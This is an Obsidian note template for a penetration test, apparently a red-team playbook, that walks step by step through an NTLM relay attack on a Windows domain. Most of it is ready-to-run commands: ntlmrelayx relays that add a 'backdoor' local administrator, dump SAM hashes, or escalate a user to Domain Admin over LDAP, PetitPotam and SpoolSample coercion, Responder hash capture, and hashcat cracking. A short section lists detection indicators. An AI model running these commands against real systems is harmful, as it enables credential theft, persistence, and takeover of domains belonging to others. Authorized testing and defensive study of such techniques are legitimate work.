---
# Attack-specific fields
relay_listener_ip:
relay_target_ip:
relay_target_fqdn:
coerce_target:
relay_method: ntlmrelayx
captured_hash:
captured_ntlm:
notes:
---

# NTLM Relay Attacks

> [!abstract] Attack Summary
> **NTLM relay** intercepts an NTLM authentication attempt and relays it to another target, authenticating as the victim. Works when the relay target lacks SMB signing or when relaying to non-SMB services (LDAP, HTTP, MSSQL). Combined with coercion techniques (PetitPotam, SpoolSample), this enables privilege escalation without cracking.

---

## Baseline (from [[00 - Engagement Baseline]])

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Domain",   b?.domain   ?? "—"],
  ["DC IP",    b?.dc_ip    ?? "—"],
  ["LHOST",    b?.lhost    ?? "—"],
  ["Username", b?.username ?? "—"],
  ["OS Env",   b?.os_env   ?? "—"],
]);
```

---

## Attack-Specific Configuration

```dataviewjs
const p = dv.current();
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
dv.table(["Field", "Value"], [
  ["Listener IP (your machine)",   `\`INPUT[text(defaultValue("${p.relay_listener_ip || b?.lhost || ''}")):relay_listener_ip]\``],
  ["Relay Target IP",              `\`INPUT[text:relay_target_ip]\``],
  ["Relay Target FQDN",           `\`INPUT[text:relay_target_fqdn]\``],
  ["Coerce Target (force auth)",   `\`INPUT[text:coerce_target]\``],
]);
```

---

## Step 1 — Identify Relay Targets (No SMB Signing)

**Linux — NetExec SMB Signing Check**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const domain   = b?.domain ?? "DOMAIN";
const dc_ip    = b?.dc_ip  ?? "DC_IP";
const username = b?.username ?? "USER";
const password = b?.password ?? "PASSWORD";
dv.paragraph("```bash\n# Find hosts without SMB signing (valid relay targets)\nnxc smb " + dc_ip + "/24 --gen-relay-list relay_targets.txt\n\n# Filter: signing:False = valid relay target\nnxc smb " + dc_ip + "/24 | grep 'signing:False'\n\n# Specific host\nnxc smb TARGET_IP -u '" + username + "' -p '" + password + "' --signing\n```");
```

> [!info] Domain Controllers always have SMB signing enabled — cannot relay SMB→SMB to DCs. But you CAN relay to LDAP/LDAPS on DCs (different protocol).

Relay target: `INPUT[text:relay_target_ip]` / `INPUT[text:relay_target_fqdn]`

---

## Step 2 — Set Up Relay Listener

**Linux — ntlmrelayx (SMB → SMB)**
```dataviewjs
const p = dv.current();
const target = p?.relay_target_ip || "TARGET_IP";
dv.paragraph("```bash\n# Relay to single target\nimpacket-ntlmrelayx -t smb://" + target + " -smb2support\n\n# Relay to list of targets\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support\n\n# Execute command on relay target\nimpacket-ntlmrelayx -t smb://" + target + " -smb2support -c 'net user backdoor Pass123! /add && net localgroup administrators backdoor /add'\n\n# Dump SAM\nimpacket-ntlmrelayx -t smb://" + target + " -smb2support --dump-lm\n```");
```

**Linux — ntlmrelayx (SMB → LDAP — for DC relay)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const dc_ip  = b?.dc_ip ?? "DC_IP";
const dc_fqdn= b?.dc_fqdn ?? "DC_FQDN";
dv.paragraph("```bash\n# Relay to LDAP on DC (add attacker to DA group)\nimpacket-ntlmrelayx -t ldap://" + dc_ip + " -smb2support\n\n# Relay to LDAPS with DA escalation\nimpacket-ntlmrelayx -t ldaps://" + dc_ip + " --escalate-user ATTACKER_USER -smb2support\n\n# Relay for RBCD setup (set msDS-AllowedToActOnBehalfOfOtherIdentity)\nimpacket-ntlmrelayx -t ldap://" + dc_ip + " -smb2support --delegate-access\n```");
```

---

## Step 3 — Trigger NTLM Authentication (Coercion)

> [!info] Use one of these methods to force the victim to authenticate to your listener.

**Linux — Responder (capture on network, then relay separately)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const lhost = b?.lhost ?? "ATTACKER_IP";
dv.paragraph("```bash\n# Start Responder to capture hashes (disable SMB/HTTP to avoid conflict with ntlmrelayx)\npython3 Responder.py -I eth0 -r -d -w\n\n# Or use in capture-only mode\npython3 Responder.py -I eth0 --no-http-server --no-smb-server\n```");
```

**Linux — PetitPotam (force machine auth)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const lhost       = b?.lhost ?? "ATTACKER_IP";
const coerceTgt   = p?.coerce_target || "VICTIM_IP_OR_HOSTNAME";
dv.paragraph("```bash\n# Unauthenticated (MS-EFSRPC)\npython3 PetitPotam.py " + lhost + " " + coerceTgt + "\n\n# Authenticated version\npython3 PetitPotam.py -u '" + (b?.username ?? "USER") + "' -p '" + (b?.password ?? "PASS") + "' -d " + (b?.domain ?? "DOMAIN") + " " + lhost + " " + coerceTgt + "\n```");
```

**Windows — SpoolSample (MS-RPRN)**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const p = dv.current();
const lhost     = b?.lhost ?? "ATTACKER_IP";
const coerceTgt = p?.coerce_target || "VICTIM_HOSTNAME";
dv.paragraph("```bash\nexecute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe " + coerceTgt + " " + lhost + "\n```");
```

Coerce target: `INPUT[text:coerce_target]`

---

## Step 4 — Relay WebDAV (Windows Auth via HTTP)

> [!info] WebDAV forces HTTP-based NTLM auth which relays to LDAP even on DCs (EPA not enforced).

**Linux — NetExec WebDAV check**
```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const dc_ip = b?.dc_ip ?? "DC_IP";
dv.paragraph("```bash\n# Check for WebDAV enabled\nnxc smb " + dc_ip + "/24 -M webdav\n\n# Start relay for WebDAV → LDAP (port 80 for WebDAV capture)\nimpacket-ntlmrelayx -t ldap://" + dc_ip + " --http-port 80 -smb2support --no-smb-server\n\n# Trigger: Coerce via path UNC that forces WebDAV auth\n# \\\\ATTACKER@80\\share\n```");
```

---

## Step 5 — Capture NTLM Hashes (Responder Mode)

```dataviewjs
const b = dv.page("Templates/New Templates/00 - Engagement Baseline");
const lhost = b?.lhost ?? "ATTACKER_IP";
dv.paragraph("```bash\n# Full capture mode (no relay)\npython3 Responder.py -I eth0 -wdF\n\n# Captured hashes are saved to: /usr/share/responder/logs/\n# Hashes in NTLMv2 format — crack with hashcat\nhashcat -a 0 -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt\n```");
```

Captured hash: `INPUT[text:captured_hash]`

---

## OPSEC

> [!warning] Detection Indicators
> - NTLM relay visible in network traffic — Wireshark shows NTLM challenges.
> - **Event 4625** (logon failure) on relay target if relay attempt fails.
> - **Event 4624** (logon success) — look for logon type 3 (network) with anomalous source.
> - PetitPotam/SpoolSample: MS-EFSRPC/MS-RPRN calls to non-expected hosts.
> - SMB signing should be enforced everywhere to prevent SMB relay.

---

## Notes & Results

`INPUT[textarea:notes]`
